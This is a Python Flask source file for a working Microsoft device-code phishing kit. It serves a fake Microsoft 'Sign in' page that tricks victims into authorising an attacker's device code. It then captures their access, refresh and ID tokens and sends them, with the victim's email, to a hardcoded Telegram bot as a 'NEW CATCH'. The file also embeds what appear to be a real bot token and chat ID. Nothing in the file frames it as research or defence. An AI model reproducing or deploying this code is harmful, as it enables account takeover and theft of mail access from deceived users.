import os
import time
import json
import base64
import sqlite3
import requests
import uuid
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# --- CONFIG ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"
DB_PATH = "/tmp/phish.db"

CLIENT_IDS = [
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
    "ab9b8c07-8f02-4f72-9fa2-a2b4ada3a5b5",  # OneDrive
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office
]
CLIENT_INDEX = 0
TENANT = "common"

# --- DB ---
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS sessions (
        vid TEXT PRIMARY KEY,
        device_code TEXT,
        user_code TEXT,
        client_id TEXT,
        interval INTEGER,
        expires_at REAL,
        status TEXT
    )""")
    conn.commit()
    conn.close()

init_db()

def db_execute(query, params=()):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(query, params)
    conn.commit()
    rows = c.fetchall()
    conn.close()
    return rows

# --- TELEGRAM ---
def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        resp = requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=15)
        print(f"[TG] status={resp.status_code}")
    except Exception as e:
        print(f"[TG ERROR] {e}")

# --- MICROSOFT ---
def initiate_device_flow():
    global CLIENT_INDEX
    for _ in range(len(CLIENT_IDS)):
        client_id = CLIENT_IDS[CLIENT_INDEX]
        try:
            resp = requests.post(
                f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode",
                data={
                    "client_id": client_id,
                    "scope": "openid profile offline_access https://graph.microsoft.com/.default Mail.Read User.Read"
                },
                timeout=15
            )
            if resp.status_code == 200:
                data = resp.json()
                data["client_id"] = client_id
                print(f"[FLOW OK] client={client_id} user_code={data['user_code']}")
                return data
            elif "invalid_client" in resp.text:
                CLIENT_INDEX = (CLIENT_INDEX + 1) % len(CLIENT_IDS)
                continue
            else:
                print(f"[MS INIT ERROR] {resp.text[:300]}")
        except Exception as e:
            print(f"[MS INIT EXCEPT] {e}")
        CLIENT_INDEX = (CLIENT_INDEX + 1) % len(CLIENT_IDS)
    return None

def poll_once(device_code, client_id):
    try:
        resp = requests.post(
            f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
            data={
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "client_id": client_id,
                "device_code": device_code
            },
            timeout=15
        )
        result = resp.json()
        if resp.status_code == 200 and "access_token" in result:
            return result
        err = result.get("error", "")
        if err in ("authorization_pending", "slow_down"):
            return "pending"
        print(f"[POLL ERROR] {result}")
        return None
    except Exception as e:
        print(f"[POLL EXCEPT] {e}")
        return "pending"

def decode_email(id_token):
    try:
        payload = id_token.split(".")[1]
        payload += "=" * (4 - len(payload) % 4)
        info = json.loads(base64.urlsafe_b64decode(payload))
        return info.get("preferred_username", info.get("upn", "Unknown"))
    except Exception:
        return "Unknown"

def handle_success(vid, tokens):
    email = decode_email(tokens.get("id_token", ""))
    msg = (
        f"<b>🔥 NEW CATCH 🔥</b>\n\n"
        f"<b>Email:</b> <code>{email}</code>\n"
        f"<b>Session:</b> <code>{vid[:8]}</code>\n\n"
        f"<b>ACCESS TOKEN:</b>\n<code>{tokens.get('access_token','')}</code>\n\n"
        f"<b>REFRESH TOKEN:</b>\n<code>{tokens.get('refresh_token','')}</code>\n\n"
        f"<b>ID TOKEN:</b>\n<code>{tokens.get('id_token','')}</code>"
    )
    send_telegram(msg)
    db_execute("UPDATE sessions SET status='completed' WHERE vid=?", (vid,))
    print(f"[SUCCESS] {vid} -> {email}")

# --- ROUTES ---
@app.route("/")
def index():
    flow = initiate_device_flow()
    if not flow:
        return "Service temporarily unavailable. Refresh the page.", 500
    vid = str(uuid.uuid4())
    db_execute(
        "INSERT OR REPLACE INTO sessions (vid, device_code, user_code, client_id, interval, expires_at, status) VALUES (?,?,?,?,?,?,?)",
        (vid, flow["device_code"], flow["user_code"], flow["client_id"],
         flow.get("interval", 5), time.time() + flow.get("expires_in", 900), "pending")
    )
    return render_template_string(PAGE, user_code=flow["user_code"], vid=vid)

@app.route("/status/<vid>")
def status(vid):
    rows = db_execute("SELECT device_code, client_id, expires_at, status FROM sessions WHERE vid=?", (vid,))
    if not rows:
        return jsonify({"status": "invalid"})
    device_code, client_id, expires_at, st = rows[0]

    if st == "completed":
        return jsonify({"status": "completed"})
    if time.time() > expires_at:
        db_execute("UPDATE sessions SET status='expired' WHERE vid=?", (vid,))
        return jsonify({"status": "expired"})

    result = poll_once(device_code, client_id)
    if result == "pending":
        return jsonify({"status": "pending"})
    if result is None:
        return jsonify({"status": "expired"})

    handle_success(vid, result)
    return jsonify({"status": "completed"})

@app.route("/test-telegram")
def test_telegram():
    send_telegram("<b>✅ Test message from outlook-verify</b>")
    return "Telegram test sent — check your chat."

# --- PAGE ---
PAGE = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in</title>
<style>
 body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
 .card{background:#fff;width:92%;max-width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
 h1{font-size:24px;font-weight:600;color:#1b1b1b;margin:0 0 12px}
 p{font-size:15px;color:#1b1b1b;line-height:1.5}
 .code{background:#f2f2f2;border:1px solid #ccc;padding:12px;font-size:26px;font-weight:600;letter-spacing:3px;text-align:center;margin:18px 0;cursor:pointer;user-select:all}
 .btn{background:#0067b8;color:#fff;border:none;padding:10px;width:100%;font-size:15px;cursor:pointer}
 .btn:hover{background:#005da6}
 #msg{margin-top:18px;font-size:14px;color:#0067b8;display:none}
 #done{margin-top:18px;font-size:14px;color:#107c10;font-weight:600;display:none}
 .footer{margin-top:36px;font-size:12px;color:#666}
</style>
</head>
<body>
<div class="card">
 <h1>Sign in</h1>
 <p>Enter the code below at <b>https://microsoft.com/devicelogin</b> to complete verification.</p>
 <div class="code">{{ user_code }}</div>
 <button class="btn" onclick="go()">Copy code and continue</button>
 <div id="msg">Waiting for sign-in…</div>
 <div id="done">✅ Sign-in successful. You can close this page.</div>
 <div class="footer">&copy; 2026 Microsoft</div>
</div>
<script>
var vid = "{{ vid }}";
function go(){
  navigator.clipboard.writeText("{{ user_code }}").catch(function(){});
  window.location.href = "https://microsoft.com/devicelogin";
}
function poll(){
  fetch("/status/" + vid)
    .then(r => r.json())
    .then(d => {
      if(d.status === "pending"){ document.getElementById("msg").style.display="block"; setTimeout(poll, 3000); }
      else if(d.status === "completed"){ document.getElementById("msg").style.display="none"; document.getElementById("done").style.display="block"; }
      else { document.getElementById("msg").style.display="none"; document.getElementById("done").style.display="block"; document.getElementById("done").textContent="Code expired. Please restart verification."; }
    })
    .catch(() => setTimeout(poll, 3000));
}
setTimeout(poll, 3000);
</script>
</body>
</html>
"""

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
